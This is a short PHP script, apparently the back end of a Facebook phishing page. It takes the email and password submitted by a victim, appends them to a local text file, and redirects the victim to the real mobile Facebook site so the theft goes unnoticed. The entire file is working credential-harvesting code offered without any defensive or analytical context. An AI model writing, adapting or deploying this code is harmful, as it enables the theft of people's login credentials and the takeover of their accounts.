<?php
 /* By Mahmoud Saeed*/
 
 $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$fp = fopen("jecksv59.txt", "a");
fwrite($fp, "$_POST[email]:$_POST[pass] \n ");
header ("location:https://m.facebook.com");
?>